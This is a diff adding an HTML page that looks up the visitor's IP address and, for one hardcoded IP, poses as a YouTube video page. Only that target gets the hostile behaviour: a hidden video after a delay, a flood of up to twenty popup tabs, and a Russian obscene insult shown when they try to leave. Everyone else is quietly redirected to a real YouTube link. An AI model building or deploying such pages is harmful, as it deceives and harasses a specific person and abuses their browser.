@@ -1,0 +1,80 @@
+<!doctype html>
+<html>
+    <head>
+        <link rel="shortcut icon" href="/img/icon.ico" type="image/x-icon" >
+        <link rel="icon" href="/img/icon.png" sizes="48x48" >
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+        <script src="/js/zepto.min.js" type="text/javascript"></script>
+        <script>
+window.GAMAZ_IP = "217.66.158.125"
+window.GAMAZ_VID = "/vid.webm"
+window.MAX_TABS = 20;
+window.TAB_SPAWN_DELAY = 700;
+window.GOTEEM_DELAY = 50000;
+window.SPAWN_MORE_DELAY = 1000;
+
+            $(document).ready(function() {
+                $.ajax({
+                url: "https://api.ipify.org?format=json",
+                context: document.body,
+                error: function() {
+                    alert("Request failed.")
+                },
+                success: function(res) {
+                    console.log(res);
+                    if (res.ip === window.GAMAZ_IP) {
+                        setTimeout(showThings, window.GOTEEM_DELAY);
+                        document.title = "Масяня. Эпизод 131. Бегулеле - YouTube";
+                        window.onbeforeunload = function() {
+                               return "Ну, давай разберем по частям тобою написанное. Складывается впечатление, что ты реально контуженный, обиженный жизнью имбецил. Могу тебе и в глаза сказать, готов приехать послушать? Вся та хуйня, тобою написанная, — это простое пиздобольство, Рэмбо ты комнатный. От того, что ты много написал, жизнь твоя лучше не станет. Пиздеть — не мешки ворочать, много вас таких по весне оттаяло. Про таких, как ты, говорят: «Мама не хотела, папа не старался». Вникай в мое послание тебе, постарайся проанализировать и сделать выводы для себя.";
+                        };
+                        $("iframe.invis").removeClass("invis");
+                    } else {
+                        window.location.href = "https://www.youtube.com/watch?v=Rl2xw-LxU-w"
+                    }
+                }
+                });
+            });
+function showThings() {
+    $("video").removeClass("invis")
+    $("video").get(0).play();
+    setTimeout(spawnMore,window.SPAWN_MORE_DELAY);
+    $("#content").remove();
+}
+window.tab_count = 0;
+function spawnMore() {
+    window.tab_count++;
+
+    if (window.tab_count > window.MAX_TABS) {
+        return;
+    }
+
+    window.open(window.GAMAZ_VID)
+    setTimeout(spawnMore, window.TAB_SPAWN_DELAY);
+}
+        </script>
+<style>
+body, html
+{
+  margin: 0; padding: 0; height: 100%; overflow: hidden;
+}
+
+  #content
+ {
+    position:absolute; left: 0; right: 0; bottom: 0; top: 0px; 
+     }
+   .invis {
+    display:none;
+   }
+</style>
+        <title>Redirecting...</title>
+   </head>
+   <body>
+       <video class="invis" width="100%" height="100%" loop>
+           <source src="/vid.webm" type="video/webm">
+       </video>
+        <div id="content">
+        <iframe class="invis" width="100%" height="100%" src="/fake_tube.html" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+        </div>
+   </body>
+</html>
